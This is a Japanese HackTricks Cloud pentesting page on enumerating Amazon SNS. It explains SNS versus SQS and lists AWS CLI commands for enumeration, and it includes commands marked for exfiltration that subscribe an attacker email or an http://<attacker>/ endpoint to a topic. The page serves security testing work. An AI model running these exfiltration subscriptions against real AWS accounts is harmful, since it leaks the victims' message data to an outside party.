# AWS - SNS Enum

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **ハッキングのトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## SNS

Amazon Simple Notification Service（Amazon SNS）は、**アプリケーション間**（A2A）および**アプリケーション対人**（A2P）通信のための**完全に管理されたメッセージングサービス**です。

A2Aパブ/サブ機能は、分散システム、マイクロサービス、およびイベント駆動型のサーバーレスアプリケーション間の**高スループット、プッシュベース、多対多**メッセージングのための**トピック**を提供します。 Amazon SNSトピックを使用すると、パブリッシャーシステムはメッセージを**多数のサブスクライバーシステム**にファンアウトできます。

### **SQSとの違い**

**SQS**は、**キューベース**のサービスであり、メッセージが**単一のコンシューマ**によって処理されることを保証します。**少なくとも一度の配信**を提供し、標準キューとFIFOキューをサポートし、リトライと遅延処理のためのメッセージの保持を許可します。\
一方、**SNS**は、**パブリッシュ/サブスクライブベースのサービス**であり、メッセージを**複数のサブスクライバー**に同時にブロードキャストすることにより、**一対多**の通信を可能にします。メール、SMS、Lambda関数、HTTP/HTTPSなどの**さまざまなサブスクリプションエンドポイント**をサポートし、対象メッセージの配信のためのフィルタリングメカニズムを提供します。\
両方のサービスは、分散システムのコンポーネント間の切り離しを可能にしますが、SQSはキュー通信に焦点を当て、SNSはイベント駆動型のファンアウト通信パターンに重点を置いています。

### **列挙**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
注意してください。**トピックがFIFOタイプの場合**、プロトコル**SQS**を使用するサブスクライバーのみが使用できます（HTTPまたはHTTPSは使用できません）。

また、`--topic-arn`にリージョンが含まれている場合でも、**`--region`**で正しいリージョンを指定してください。そうしないと、アクセス権限がないというエラーが表示されますが、問題はリージョンです。
{% endhint %}

### 認証されていないアクセス

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

### 特権昇格

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

### 攻撃後の利用

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

### 永続化

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksの最新バージョンを入手したい**、または**PEASSをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
